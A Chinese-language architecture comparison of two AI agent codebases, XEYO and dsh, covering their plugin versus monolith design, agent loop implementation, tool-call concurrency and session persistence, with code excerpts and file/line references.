| 架构基座 | 自研单体引擎（Python）+ FastAPI + React/Tauri 壳 | [Cordis](https://github.com/cordiverse/cordis) 元框架（插件/服务/可回滚副作用），形式化论文 arXiv:2608.25512 |
| 成熟度 | 内测/自用（有镜像容灾、事故复盘文化） | **developer preview**（`README.md:11` 明写 *THERE WILL BE COMPATIBILITY-BREAKING CHANGES*） |

**这是最根本的分歧**：XEYO 把「怎么让模型看到正确的信息」当作第一性问题并在引擎文本层面立法；dsh 把「怎么让任何一块能力都能被换掉」当作第一性问题并在**组合结构**层面立法。两者甚至不冲突——但取向完全不同。

---

##### 2. 顶层架构范式

###### 2.1 dsh：255 个包的 Cordis 插件树

- `docs/architecture.md:11`：*"Every part of the product is a plugin, including the model adapter, the tool registry, the session log, and the agent loop itself"*。
- **注册即 effect**：`AGENTS.md:105`「every contribution goes through `ctx.effect()` / `ctx.on()`; a registry's `register()` returns the disposer」——插件卸载时注册项自动解绑。
- **68 个服务缝**（`docs/capability-seams.md` 生成图，实测提取）：
  `ctx.sessions`、`ctx.tools`、`ctx.systemPrompt`、`ctx.agents`、`ctx.agentLoop`、`ctx.llm`、`ctx.fs`、`ctx.shell`、`ctx.subprocess`、`ctx.terminals`、`ctx.sandbox`、`ctx.sandboxPolicy`、`ctx.approval`、`ctx.userQuestions`、`ctx.permissionPresets`、`ctx.subagents`、`ctx.skills`、`ctx.compaction`、`ctx.spillStore`、`ctx.codeRuntime`、`ctx.workflowEngine`、`ctx.goals`、`ctx.jobs`、`ctx.schedule`（工具）、`ctx.webhookRuntime`、`ctx.web`、`ctx.lsp`、`ctx.attachments`、`ctx.credentials`、`ctx.authorization`、`ctx.settings`、`ctx.storage`、`ctx.storageDomain`、`ctx.sessionPersistence`、`ctx.sessionProjections`、`ctx.sessionProjectionCache`、`ctx.sessionQuery`、`ctx.sessionTitle`、`ctx.sessionTelemetry`、`ctx.workspaceRegistry`、`ctx.commands`、`ctx.agentPresets`、`ctx.clientModules`、`ctx.typert`、`ctx.typertGateway`、`ctx.webServer`、`ctx.dynamicCordisRunner`、`ctx.cordisInspect`、`ctx.inspector`、`ctx.invariants`、`ctx.tokenMeter`、`ctx.toolResultPruner`、`ctx.spillStore`、`ctx.fileReferences`、`ctx.fileUploads`、`ctx.sessionFileReferences`、`ctx.sessionSkillCatalog`、`ctx.messageFeedback`、`ctx.sessionReferenceResolver`、`ctx.planMode`、`ctx.directoryPicker`、`ctx.agentTeams`、`ctx.agentDefaultModel`、`ctx.subagentModelSelection`、`ctx.shellEnv`、`ctx.deepseekLlmApiExtensions`、`ctx.agentToolPresentation` 等。
- **能力缝三角色**（`docs/architecture.md:117`）：Service Definition（抽象类）/ Service Provider（唯一实现）/ Consumer（通常是模型可见工具）。例：`packages/shell/shell/src/index.ts:64` `abstract class ShellExecutor extends Service`，实现 `bash-local`/`pwsh-local`，消费方 `tool-bash`。
- **组合层**：Profile（5 档：`web`/`headless`/`sdk`/`sdk-minimal`/`acp`，`packages/boot/app-boot/src/profile.ts:137-158`）→ Bundle（`base`/`web-app`/`headless`/`sdk-app`/`sdk-minimal`/`acp-app`）→ 用户 `cordis.patch.yml` → `--patch` 覆盖层（`docs/architecture.md:27`）。

###### 2.2 XEYO：单体引擎 + 注入管线

- `python/AGENTS.md` 的「入口与运行模型」给出四入口（GUI/TUI/CLI/attach）。
- 没有插件容器；扩展面是**固定枚举**的三条：`extension/`（MCP + 插件 + hooks）、`slash/`（斜杠命令）、`skills/`（技能目录）。
- 架构约束反向：`AGENTS.md` 反巨石规则「新逻辑一律进新模块，既有巨石（`chat.py`/`query_loop.py`/`Composer.tsx`）只留接线点」——即用**文件级模块隔离**替代运行期插件隔离。

###### 2.3 对照结论

| 维度 | XEYO | dsh |
|---|---|---|
| 扩展机制 | 编译期枚举 + 配置开关 | 运行期挂载/卸载插件，effect 自动回收 |
| 可替换粒度 | 整包替换（改代码） | 单个 seam 的 provider 替换（改配置） |
| 配置载体 | `~/.xeyo/settings.json` + `<ws>/.xeyo/settings.json` | `cordis.yml` + `cordis.patch.yml`（YAML + `!!js` 表达式） |
| 失败姿态 | 坏 JSON → keep-last-good | 配置错误 → **fail loud**（`AGENTS.md:116`） |

---


> 来源：**R2 设计面·设计级对比** · 原节「1. 设计范式总纲：两个第一性问题」（源 L103–140）

##### 1. 设计范式总纲：两个第一性问题

两个仓库规模相近，但对"什么是这个系统里最难的问题"给出了完全不同的答案。这决定了后面 29 个系统的每一个设计。

###### 1.1 XEYO：第一性问题是「模型注意力里出现了什么」

`AGENTS.md` 设计理念节把这条写成了引擎铁律，五条：只给信息 / 模型自决 / 限制只在执行层 / 能静默就不说话 / 弱模型护栏不做在引擎文本里。落到代码上是三种机制：

1. **引擎文本立法**：`python/prompt/system_prompt.py:9-11` 注释「引擎不向模型注意力注入任何纪律/建议/劝导文本——行为约束一律由执行层静默强制」。
2. **注入管线收口**：所有易变内容必须走 `pre_llm_inject.py`，且受 `T_NOW_BLOCK_REGISTRY`（20 块）+ `T_NOW_BLOCK_HARD_CAP=21` + `tests/test_t_now_block_registry.py` 四条用例机器执法。
3. **执行层强制**：不让模型看到约束，而是让工具**静默报错**（如 `missing_read: no prior Read for this path in this session`）。

代价：引擎是**不可替换的单体**，任何行为变化都要改引擎代码。

###### 1.2 dsh：第一性问题是「这一块能不能被换掉」

`docs/architecture.md:13`：「There is no privileged core to patch」——连 agent loop 本身都是插件。落到代码上：

1. **68→69 个服务缝**（本轮实测 `docs/capability-seams.md` 70 行、69 个唯一 `ctx.<name>`）：`ctx.tools`、`ctx.llm`、`ctx.fs`、`ctx.shell`、`ctx.sandbox`、`ctx.sessions`、`ctx.agentLoop`…
2. **注册即 effect**：`ToolRuntime.register()` 走 `this.layers.effect(...)`，返回 disposer，插件卸载自动解绑（`core/tools/src/index.ts:1028-1053`）。
3. **组合三层**：Profile（5 档）→ Bundle → 用户 `cordis.patch.yml` → `--patch`。

代价：任何"全局纪律"都无处安放——没有白名单，没有硬顶，谁都能往上下文塞东西；只有 `model-visible ⟺ logged` 一条可审计性底线（`architecture.md:111`）。

###### 1.3 三分法对照

| 设计维度 | XEYO | dsh |
|---|---|---|
| **复杂度放在哪** | 信息是否应该进入注意力 | 结构是否可被替换 |
| **一致性靠什么** | 磁盘 transcript 权威 + 投影函数重算 | 事件日志即真相 + 运行时不变量校验 |
| **失败姿态** | keep-last-good（坏 JSON 保留上一份好配置）+ 静默降级 | fail-loud（配置错误直接炸）+ fail-closed（沙箱不可用即拒绝执行） |
| **扩展方式** | 编译期枚举 + 配置开关（三条固定扩展面） | 运行期挂载/卸载 + effect 回收 |
| **一句话** | 一个**策略引擎** | 一个**运行时内核** |

下面 29 个系统，都是这三分法在不同层面上的投影。

---


## 域 02 · 运行入口与产品形态

> 来源：**R1 功能面·全量对比** · 原节「3. 运行入口与产品形态」（源 L72–82）

##### 3. 运行入口与产品形态

| | XEYO | dsh |
|---|---|---|
| 入口 | `XEYO.bat`（Tauri dev）、`XEYO-TUI.bat`（Ink）、`python -m cli`（Typer）、attach HTTP | `dsh` CLI 单一入口：`dsh web` / `--profile headless` / `--profile sdk` / `--profile sdk-minimal` / `--profile acp`（`docs/architecture.md:43`） |
| 应用数 | 3 端（GUI/TUI/CLI） | 5 profile（+Python SDK 运行时） |
| 启动约束 | 无特殊约束 | **应用只能由 `dsh` profile 启动**；`verify-application-entrypoints` 机器执法（`AGENTS.md:9`） |
| 协议 | FastAPI + SSE（`/v1/chat/completions`） | Typert RPC 网关（WebSocket mux）+ HTTP `/api`；ACP（JSON-RPC stdio）；SDK（newline-delimited JSON-RPC） |

---


## 域 03 · Agent 主循环

> 来源：**R1 功能面·全量对比** · 原节「4. Agent 主循环」（源 L83–111）

##### 4. Agent 主循环

###### dsh

- **turn/step 两级**（`docs/architecture.md:76-95`）：一个 *step* = 一次模型请求 + 它调用的工具；一个 *turn* = 0..n 个 step。
- 序列：`turn/start` → claim input → 装配 prompt sections + tool schemas → `agent/pre-step`（waterfall，可改写/拒绝）→ `step/start` → 写 `user/message` → `deriveMessages()` → `agent/request`→`llm/stream`→assistant stream → `tool/call*` → `tools/pre-execute`→`tools/execute`→`tools/post-execute`→`tool/result*` → `step/end` → 若欠一个请求或来了新输入则继续 → `agent/turn-stopping` → `turn/end`。实现：`packages/core/agent-loop/src/agent.ts:258-342`（turn）、`:344-482`（step）。
- **瀑布式拦截**：`agent/pre-step`、`agent/request`、`llm/stream`、`tools/*` 三个都是 waterfall，**listener 必须调 `next()`** 才委派（`AGENTS.md:109`）；`agent/turn-stopping` 是串行无 next。
- 终止原因：无 tool-call、`concludesTurn`、max-tokens（粘性）、reject→blocked、error、aborted（`agent.ts:279-282,471-476`）。
- 取消：每阶段一个 `AbortController`，`cancel()` 带 `{kind:'user'|'parent'|'hook'|'disposed'}` 归因（`agent.ts:146-152`）。

###### XEYO

- **单层 turn 循环**：`python/engine/query_loop.py:726` 起，`while True` 在 `:796`。
- 序列：abort 检查 → `budget.prepare_next_turn()`（失败进收尾窗 `:800-812`）→ 投影 `project_for_model`（C0/C1/C2，`:924`）→ `first_sniff` 首轮嗅探 → `_attach_turn_context` 注入 T_now → `prompt.build` + `tools.schemas()`（缓存冻结）→ `model.stream` → `_admit_tool_use` 配额/并发 → `run_tools_partitioned` → `store.append(tool_result_message)` → 下一轮。
- 终止：aborted / budget_usd / max_turns / token budget / 无 tool_uses→`FinalEvent`（`:1540`）/ Plan 模式审批（`:1437-1538`）。
- 恢复：`engine/resume_directive.py` 用 contextvar + 投影-only 送达，**不落库**。
- 粘性 vs 重置：`schemas_json_cache` 跨 turn 冻结（`:1012-1018`）；`repeat_guard`/`zero_hit_tracker`/`result_fold` **每次 submit 重建**（`:774-785`）。

###### 差异

| 维度 | XEYO | dsh |
|---|---|---|
| 循环抽象 | 硬编码在 `query_loop.py` | `ctx.agentLoop` 本身是可替换的 seam |
| 拦截点 | 代码内联的 guard/flag | 命名 waterfall 事件，插件可挂 |
| 步/轮区分 | 无独立 step 概念 | turn/step 两级，且 step 是**持久事件** |
| 工具并发 | `_admit_tool_use` 只读早并发 | `isConcurrencySafe` → parallel/exclusive，`DEFAULT_MAX_PARALLEL_TOOL_CALLS=10`（`agent-loop/constants.ts:6`） |

---


> 来源：**R2 设计面·设计级对比** · 原节「2. Agent 主循环」（源 L141–214）

##### 2. Agent 主循环

###### 2.1 dsh：turn / step 双循环 + 可替换的 loop

**抽象**：`AgentLoop`（`core/agent-loop/src/index.ts:359`）→ `createAgent`/`resume` → `Agent.turn()`（`agent.ts:258`）。

**数据流**（精确到函数）：

```
turn(turn:number)                                   agent.ts:258
  ├ while true:
  │   ├ preStep(target, {turn, step})                agent.ts:237
  │   │   └ ctx.waterfall('agent/pre-step', {messages: claimed, ...})   agent.ts:247
  │   │        → decision: reject | {assembly, startsRequestSeries}     agent.ts:254
  │   │        assembly = await systemPrompt.assemble(...)              agent.ts:242
  │   ├ step(assembly, startsRequestSeries)          agent.ts:344
  │   │   ├ buildRequest(turn, step, assembly.tools, renderPrompt(assembly),
  │   │   │              session.deriveMessages(), ...)                 agent.ts:353
  │   │   ├ llm.stream(request) / preparedCall.stream(request)          agent.ts:374
  │   │   ├ session.append('assistant/message', {...})                  agent.ts:460
  │   │   ├ 无 tool-call → return {kind:'completed'}                    agent.ts:471
  │   │   └ executeToolCalls(...)                    agent.ts:472 → tool-calls.ts:60
  │   │        ├ runGroup(...) 有界并行池             tool-calls.ts:122,200
  │   │        ├ parallel 整组并行 / exclusive 成栅栏  tool-calls.ts:90
  │   │        ├ commitReady 按 model order 提交      tool-calls.ts:147
  │   │        └ session.append('tool/result')        tool-calls.ts:282
  │   └ inbox.splice('next-step', ...) → 继续         agent.ts:474
```

**终止条件**（三条，`agent.ts:279-282, 311, 316, 471`）：① 无 tool call；② `inbox.nextStep` 空且 `turnEnds` 已置；③ abort 抛错。

**中断**：`AbortSignal` 贯穿 + `raceAbort`（`agent-loop/index.ts:150`）；`cancel()` 带归因 `{kind:'user'|'parent'|'hook'|'disposed'}`（`agent.ts:146-152`）。**恢复**：`resume`（`index.ts:831`）读持久化后由 `interruptedTurnClosers` 补 closers（`index.ts:878`）——即"把上次没写完的收尾事件补齐"，而不是重放。

**设计要点**：`ctx.agentLoop` 本身是 seam；`step` 是**持久事件**（`step/start`/`step/end` 入日志）。这两条合起来意味着"换一个主循环实现"和"回放任何一步"都是被支持的。

###### 2.2 XEYO：单 generator + 隐式阶段

**抽象**：一个 async generator `query_loop`（`engine/query_loop.py:726`），`while True`（`:796`）。没有 loop 抽象，没有 step 概念。

```
while True:                                                    query_loop.py:796
  ├ abort.aborted → StoppedEvent("aborted")                    :797
  ├ budget.prepare_next_turn() 失败 → forced_wrap_up + Stopped  :800
  ├ project_for_model (C0/C1/C2)                               :924
  ├ first_sniff 首轮嗅探 / _attach_turn_context 注入 T_now
  ├ prompt.build + tools.schemas()（_schemas_cache 冻结）      :1012-1018
  ├ model.stream → chunk.kind=="tool_use" → _admit_tool_use    :1141-1157
  ├ run_tools_partitioned / tools.run(...)                     :1893
  └ store.append(tool_result_message) → 下一轮
```

**终止**：aborted / budget_usd / max_turns / token budget / 无 tool_uses → `FinalEvent`（`:1540`）/ Plan 审批（`:1437-1538`）。

**并发**：`late_task`/`early_task` 两组 asyncio task + `result_q` 投递 + `wake` event（`:1737-1769`）；只读工具早并发（`_admit_tool_use`）；硬上限在编排层信号量（默认 10，`budget.py:21`）。

**中断恢复**：`except Aborted` → `_fill_missing_tool_results` + `StoppedEvent`（`:1801-1810, 1829-1838`）——**补齐缺失的 tool_result 以维持配对**；`_repair_unpaired_tool_calls`（`:795`）同源。`ensure_before` 让 rewind Before 快照与首轮 stream 重叠（`:744`）。

**粘性 vs 重置**：`schemas_json_cache` 跨 turn 冻结；`repeat_guard`/`zero_hit_tracker`/`result_fold` **每次 submit 重建**（`:774-785`）——这是"哪些状态属于会话、哪些属于这一轮"的显式划分。

###### 2.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 循环本身 | seam（可换实现） | 硬编码在 `query_loop.py` |
| 阶段边界 | turn/step 两级且**入日志** | 隐式，靠函数调用顺序 |
| 拦截点 | 命名 waterfall（`agent/pre-step`/`agent/request`/`llm/stream`） | 代码内联 guard |
| 工具输出解析 | 结构化 `block.type==='tool-call'` | 结构化 `chunk.tool_use` + **XML 兜底**（`xml_tool_call.py:99`） |
| 并发语义 | 有界池 + exclusive 栅栏 + 按模型顺序提交 | asyncio 双队列 + 信号量 |
| 中断后 | 补 closers（保证日志闭合） | 补 tool_result（保证配对闭合） |

XEYO 的 XML 兜底是 dsh 没有的——这是为弱模型准备的执行层机制（模型把 tool call 写成 XML 文本时的抢救），符合"限制只在执行层"的定位。

---


> 来源：**R3 实现面·实现级对比** · 原节「1. Agent 主循环：实现级」（源 L20–245）

##### 1. Agent 主循环：实现级

###### 1.1 dsh `ReactLoopAgent`：显式状态机 + 双层循环

**文件**：`packages/core/agent-loop/src/agent.ts`（589 行）

不同于设计文档里的抽象描述，实现是一个**显式相位状态机**：

```ts
// agent.ts:39-47
type Phase =
  | { kind: 'idle'; lastTurn: number }
  | { kind: 'maintenance'; abort: AbortController; lastTurn: number; wakeRequested: boolean }
  | { kind: 'running'; abort: AbortController; turn: number; step: number; wakeRequested: boolean }
```

**相位迁移**由唯一入口 `setPhase()`（`:116-123`）负责，并顺带发布 `agent/status` 事件——状态可见性不靠散落的 emit。

**外层 `turn()`（`:258-342`）逐语句**：

| 行 | 动作 |
|---|---|
| `:265` | `const turn = phase.turn + 1` |
| `:267` | `session.append('turn/start', { turn })` |
| `:278` | `await this.preStep(target, { turn, step })` —— 一次 pre-step 提议 |
| `:279-282` | `decision.kind === 'reject'` → `turnEnds = { kind: 'blocked' }`，`return false` |
| `:283` | `if (turnEnds && decision.messages.length === 0) break` —— 已定局且无新输入即终结 |
| `:286-289` | `phase.step === 0 && messages.length === 0` → `{ kind: 'completed' }`，**不烧模型调用** |
| `:291` | `session.append('step/start', { turn, step })` |
| `:294-296` | 把 `decision.messages` 逐条 `session.append('user/message', …)` |
| `:299` | `const stepEnd = await this.step(...)` |
| `:302` | **max-tokens 粘滞**：`if (turnEnds === null \|\| turnEnds.kind !== 'max-tokens') turnEnds = stepEnd` |
| `:304` | `finally { session.append('step/end', …) }` |
| `:307-310` | `turnEnds && inbox.nextStep.length === 0` → `await dispatch.serial('agent/turn-stopping', …)` |
| `:311` | 再判一次 `turnEnds && nextStep.length === 0` → `break` |
| `:312` | `target = 'next-step'`（第二轮起从 next-step 取件） |
| `:331` | `finally { session.append('turn/end', { turn, reason: turnEnds }) }` |
| `:336-341` | `if (!inbox.hasPending) return false`；否则**换新 AbortController**、清 `wakeRequested`、`step = 0`、`return true` |

关键实现选择：
- **turn 未真正结束时不会 append `turn/end`**——`turnEnds` 由所有退出路径赋值，`finally` 里用 `turnEnds!` 断言（`oxlint-disable` 注释说明了有界性）。
- **error 的结构化**（`:314-327`）：`signal.aborted` → `{kind:'aborted', reason}`；否则 `error instanceof LlmError` → 保留 `error.failure` 事实，其他一律 `{ message: errorChain(error), code: 'UNKNOWN' }`。
- 每轮 turn 结束后**换新 AbortController**（`:337`），使旧 controller 上的 latch 失效。

**内层 `step()`（`:344-482`）是一个 `while(true)` 重试环**——同一 step 内可因 `agent/request-error` 瀑布返回 `retry` 而重新发起模型调用：

```ts
// agent.ts:425-448（缩略）
const finish = live.finish
if (finish.kind === 'error' || finish.kind === 'aborted') {
  live.settle('assistant/attempt', () => session.append('assistant/attempt', { turn, step, stream: live.stream }).seq)
  const action = await this.dispatch.waterfall('agent/request-error', {
    turn, step, provider: request.provider, failure: finish.failure,
    retryPolicy: preparedCall?.retryPolicy, signal,
  }, () => Promise.resolve<RequestErrorAction>(undefined))
  if (action?.kind !== 'retry') throw new LlmError(finish.failure.message, finish.failure.code, finish.failure)
  continue                            // ← 同 step 重试
}
```

**终止条件全集**（`step()` 返回值）：`{kind:'max-tokens'}`（`:468`）、`{kind:'completed'}`（无 tool call，`:471`）、`null`（有 tool call 且未 conclude，继续同 turn 下一 step，`:476`）。`concluded` 来自工具的 `concludesTurn` 标记（`tool-calls.ts:158`）。

**pre-step 提议链（`:237-255`）**——注意这里有一个**顺序陷阱**，实现是有意为之：

```ts
const claimed = this.inbox.claim(target, position.turn)
const assembly = await this.loopCtx.systemPrompt.assemble(assembleContextFor(this, signal))
signal.throwIfAborted()
const sections = renderContextSections(assembly)
const context = this.runtimeContext.project(joinContextSections(sections), sections)
const decision = await this.dispatch.waterfall('agent/pre-step', { messages: claimed, ...position, signal },
  () => Promise.resolve<PreStepDecision>({
    kind: 'enter',
    messages: context === undefined ? claimed : [...claimed, context],
  }))
```

即：**先 claim（取件）→ 再 assemble（组装 prompt）→ 再投影出 runtime context → 最后走 waterfall**。runtime context 作为**一条追加的 user 消息**进入 `messages`（不是 system）。

###### 1.2 dsh 工具调用并发调度器：有界滚动池 + 顺序提交

**文件**：`packages/core/agent-loop/src/tool-calls.ts`（290 行）+ `constants.ts`

```ts
// constants.ts:6
export const DEFAULT_MAX_PARALLEL_TOOL_CALLS = 10
```

`executeToolCalls(ctx, turn, step, toolCalls, signal, acceptContext)`（`:60-102`）的算法：

1. **先全量计划**：把每个 `ToolCallBlock` 转成 `PlannedCall { block, exec }`，其中 `arguments: parseArguments(block.arguments)`；
2. `parseArguments`（`:105-111`）**不抛错**——`raw ? JSON.parse(raw) : {}`，解析失败**原样保留字符串**（`catch { return raw }`），把问题留给工具自身的 schema 校验；
3. `while (next < planned.length)`：**每次重新分类**——`const mode = ctx.tools.executionMode(first.exec).kind`（`:89`）。若是 `parallel`，把**剩余全部**纳入同一 group；若是 `exclusive`，group 只含这一个（barrier）。
4. `runGroup(...)` 返回 `{consumed, aborted, concluded}`；`aborted` 时把**剩余未启动的调用**逐条 `appendSkippedToolCall`，然后 `return`。

**`runGroup`（`:122-247`）的三段式**：

| 段 | 机制 |
|---|---|
| `commitReady()` `:147-161` | 只沿**连续**的模型序槽位推进（`committed` 指针），槽位就绪则 `finalize`（需 post）或 `finish`，`session.append('tool/result', …, { surfaceOp:'append', sourceEventSeqs:[callSeq] })`，并把 `result.additionalContexts` 交给 `acceptContext` |
| `startCall(i)` `:165-197` | 先 `appendToolCall`（拿到 seq 供结果引用）→ `await scheduler.prepare(exec)` → 按 `prepared.kind` 三态：`dispatch`（进 `inFlight`）、`post-result`（直接占槽，仍需 post）、`final-result`（直接占槽，跳过 post） |
| `fillPool()` `:199-214` | `while (!aborted && nextToStart < group.length && inFlight.size < maxParallelToolCalls)`——**启动前重读后续 mode**：`if (nextToStart > 0 && mode === 'parallel' && ctx.tools.executionMode(nextCall.exec).kind !== 'parallel') break`，即**运行期注册表变化可以随时插入 barrier** |

**主等待环（`:219-236`）**用 `Promise.race(inFlight.values())` 收割，每收一个就 `delete` → `commitReady()` → `fillPool()`：

```ts
await fillPool()
while (inFlight.size > 0) {
  const settledIndex = await Promise.race(inFlight.values())
  inFlight.delete(settledIndex)
  throwSchedulerFailure()
  await commitReady()
  throwSchedulerFailure()
  if (signal.aborted) aborted = true
  await fillPool()
}
```

**abort 语义（`:238-243`）**：

```ts
if (aborted) {
  for (const call of group.slice(started)) appendSkippedToolCall(session, turn, step, call.block)
  return { consumed: group.length, aborted: true, concluded }
}
```

`splice` 掉的调用拿到**合成错误结果**（`:250-260`）：

```ts
content: [{ type: 'text', text: 'Error: tool call aborted before dispatch' }],
isError: true,
error: { message: 'tool call aborted before dispatch', info: { name: 'AbortError', code: TOOL_ABORTED_BEFORE_DISPATCH } },
```

注释（`:7-11`）说明了这个设计的复现动机：**「Abort records synthetic error results for skipped calls so replay stays valid.」** 而**调度器自身失败**（非 abort）刻意不合成结果：`await Promise.allSettled(inFlight.values()); throw schedulerFailure.error`（`:232-236`）——`tool/call` 已落盘就保留，不编造结果。

###### 1.3 dsh 流式累积：一次快照三处消费

**文件**：`packages/core/agent-loop/src/assistant-stream.ts`（140 行）

`AssistantStreamAttempt` 同时持有两个累积器，`push()`（`:60-71`）对每个 chunk **只取一次时间戳**，然后喂三处：

```ts
push(chunk: StreamChunk): void {
  const timed = this.accumulator.push({ time: Date.now(), chunk })   // ① durable 压缩流
  this.assembler.push(timed.chunk)                                    // ② 组装成 blocks
  this.emit({ type: 'chunk', attemptId, revision: this.nextRevision(), index: this.index++, time: timed.time, chunk: timed.chunk })  // ③ 实时帧
}
```

- **durable**：`accumulator.snapshot()`（`:112-114`）就是最终写入 `assistant/message.stream` 的「紧凑原始流」——`agent.ts:465` 把 `stream: live.stream` 一起落事件，**模型输出与其原始流一同持久化**（这是「每字重建模型当时看到什么」的实现基础）。
- **组装**：`assembler.blocks()`（正常）、`interruptedBlocks()`（中断时的可见前缀，`:122-124`）、`usage`、`finish`、`replayState` 全部从 assembler 取。
- **实时**：帧带 `revision` 自增计数（由 agent 的 `assistantStreamRevision` 提供，`agent.ts:367`），`settle()` 在**durable append 成功之后**才发 `end` 帧（`:78-97`），append 抛错则 `abandon()`（发 `{kind:'abandoned'}`）再抛。

**中断时的持久化分叉（`agent.ts:383-424`）**：

```ts
if (signal.aborted) {
  const content = live.interruptedBlocks()
  if (content.length > 0) live.settle('assistant/message', () => session.append('assistant/message', { … content, interrupted: true, usage, stream }, …).seq)
  else                   live.settle('assistant/attempt', () => session.append('assistant/attempt', { turn, step, stream: live.stream }).seq)
}
```

即有可见内容 → `assistant/message` + `interrupted: true`；零内容 → `assistant/attempt`（log-only，不进投影）。二次失败包成 `AggregateError`（`:416-422`），不吞。

###### 1.4 XEYO `query_loop`：单 generator + 循环内联阶段

**文件**：`python/engine/query_loop.py`（2000 行）

```python
async def query_loop(*, store: MessageStore, model: ModelClient, tools: ToolRegistry,
                     prompt: PromptAssembler, system_prompt: str, abort: AbortController,
                     budget: BudgetTracker, working: WorkingSnapshot | None = None,
                     coordinator: PermissionCoordinator | None = None,
                     system_breakdown: list[dict] | None = None, agent_mode: str = "agent",
                     multi_agent: bool = False, include_memory_index: bool = True,
                     ensure_before: Any | None = None) -> AsyncIterator[EngineEvent]:
```

**无状态机、无相位枚举**——状态是函数体内的局部变量。主 `while True:` 在 `:796`，循环头部两个门：

```python
while True:
    if abort.aborted:
        yield StoppedEvent(reason="aborted"); return
    if not budget.prepare_next_turn():
        ...   # 预算门 → StoppedEvent(reason="budget"/"budget_usd")
```

**循环内建的守卫对象（每个 submit 新建 = 用户输入级重置）**：

| 对象 | 行 | 作用 |
|---|---|---|
| `RepeatCallGuard()` | `:766` | 同签名重复调用，阈值 `[3,5,8]` 递进提醒，**只提醒不拒执行** |
| `IdenticalResultFold()` | `:769` | 同签名·同输出**字节级折叠**为一行 `[fold]` 事实写回 store |
| `LoopLedger(exempt_tools=EXEMPT_TOOLS)` | `:772` | 行为账本：s1 结果等价 / s2 内容已见 / s3 首句重复 |
| `ZeroHitTracker()` | `:774` | 不同查询累计空结果 ≥2 → 追加中立提示 |
| `forced_wrap_up` / `wrap_quota_left` | `:783-784` | 硬停前一次性收尾放行；配额默认 3（`XEYO_WRAP_QUOTA` 覆盖，`0` = 全禁） |

**终止/中断实现**：
- 中断靠 `abort.aborted` 轮首+轮中检查，产出 `StoppedEvent(reason="aborted")`；`StoppedEvent.interrupted: bool`（`events.py:104`）用于标注「已有部分输出」；
- `_persist_interrupted_anchor(...)`（`:311`）在中断时把已有输出锚进 transcript；
- 配对修复 `_repair_unpaired_tool_calls(store, "aborted")`（`:218-243`）**只在 submit 入口做一次**，注释明确「不在每轮模型请求前全量扫 store」；
- `_fill_missing_tool_results(store, tool_uses, reason)`（`:244-247`）为缺失结果补占位。

**重试实现（与 dsh 的 waterfall 完全不同形态）**：`_llm_max_attempts()`（`:263`）`max(1, min(n, 5))`，`_llm_retry_delay_ms(attempt, retry_after_ms)`（`:273-281`）计算退避，`_audit_llm_failure(...)`（`:292`）落审计；事件 `llm_retry` / `llm_retry_started`（`events.py:287-310`）明确标注**「非 surface 事件 / 不进 transcript」**。

**并发**：多个 tool_use 的调度在 `:1743-1798` 一段。XEYO **没有 dsh 式的并发池抽象**——是内联的 `while pending:` 循环 + `_eligible_for_early()`（`:155`）判断只读工具可否提前执行，配 `_cancel_early_tasks()`（`:179`）。`early_readonly_tools_enabled()`（`:112`）读环境开关。

###### 1.5 主循环实现级对照

| 实现维度 | dsh | XEYO |
|---|---|---|
| 结构 | `Phase` 显式状态机 + `turn()`/`step()` 双方法 | 单 `query_loop` generator + 局部变量 |
| 状态存放 | 类字段（`phase`、`requestHeaderLogged`、`requestSurfaceGeneration`、`assistantStreamRevision`） | 函数局部（每 submit 重建） |
| step 重试 | `step()` 内 `while(true)` + `agent/request-error` waterfall 决定 `retry` | 内联退避 `_llm_retry_delay_ms` + 事件外发 |
| 并发调度 | `executeToolCalls` 有界池（10）+ `exclusive` barrier + `Promise.race` 顺序提交 | 内联 `while pending`；只读工具可早跑 |
| 注册表变更能否插 barrier | **能**（`fillPool` 每次重读 `executionMode`） | 无此概念 |
| 中断的落盘 | 已启动 → 提交；未启动 → **合成错误结果**（保 replay 有效） | 补占位 + `interrupted` 锚 |
| max-tokens | `TurnEndReason['max-tokens']` **粘滞**（后续 step 不降级） | `StoppedEvent(reason=...)` 单值 |
| 模型原始流 | **完整持久化**（`assistant/message.stream`） | 不落原始流（落组装后 transcript） |

---


## 域 04 · 会话数据模型与持久化

> 来源：**R1 功能面·全量对比** · 原节「5. 会话数据模型（**最大的结构差异**）」（源 L112–148）

##### 5. 会话数据模型（**最大的结构差异**）

###### dsh：事件溯源日志

- **append-only `SessionEvent` log 是唯一真相源**；`deriveMessages()` 从日志投影出模型历史（`docs/architecture.md:107`）。
- 事件类型（`packages/core/session/src/types.ts:260-376`）：
  `turn/start`、`turn/end`、`step/start`、`step/end`、`user/message`、`assistant/message`、`assistant/attempt`、`tool/call`、`tool/result`、`request/header`、`request/context`、`session/end-seed`；插件扩展类型 70+ 种（`known-event-types.ts:22-74`）。
- **Surface 概念**：`SurfaceEventType = user/message | assistant/message | tool/result`（`types.ts:387-391`）——只有这三类进模型历史；`surfaceOp: 'append' | {op:'replace',start,end}`（`surface.ts:416-418`）。
- 版本：`SESSION_FORMAT_VERSION = 2`（`types.ts:86`），header 校验（`index.ts:101-103`）；`seq = log.length` 连续契约（`index.ts:659-661`）；append 前 `snapshotJsonValue` 强制 lossless JSON（`index.ts:709-716`）。
- **代际迁移**：v0 `session.jsonl[.zstd]`，v1+ `session.vN.jsonl[.zstd]`；**已提交代际永不重命名/覆盖/删除**，打开旧版时在内存里链式迁移并**并排发布**新代（`docs/architecture.md:109`）。
- `assistant/message` 内嵌**该步精确的压缩流**（`stream: AssistantStreamRecord[]`），失败的尝试进 `assistant/attempt`——不伪造模型历史。
- 派生能力：fork / resume / transcript / telemetry / persistence 全部从日志派生。
- `session/end-seed` 标记 seed 边界（resume/fork/replay 继承前缀）。

###### XEYO：消息级 transcript + 三层存储

- 三层：前端 IndexedDB（`gui/src/lib/db.ts:17-37`，库 `xeyo-web` v4）→ 后端 `~/.xeyo/sessions/<id>.jsonl`（`python/session/persistence.py:39,62`）→ `_workspace_index.jsonl`（`session/ws_index.py:38`）。
- 记录格式（`session/record_transcript.py:205`）：`{id,role,content,tool_call_id,name,narration?,interrupted?,ts}`——**消息级、非事件级**。
- 写入：后台线程批量 + fsync（`:143-156`），轮转保留 2 代（`:65,81`）。
- 生命周期接口（`server/routers/sessions.py`）：archive `:558`、restore `:575`、DELETE `:191`（常态 409 `archived_required`）、fork `:483`、rename `:464`。
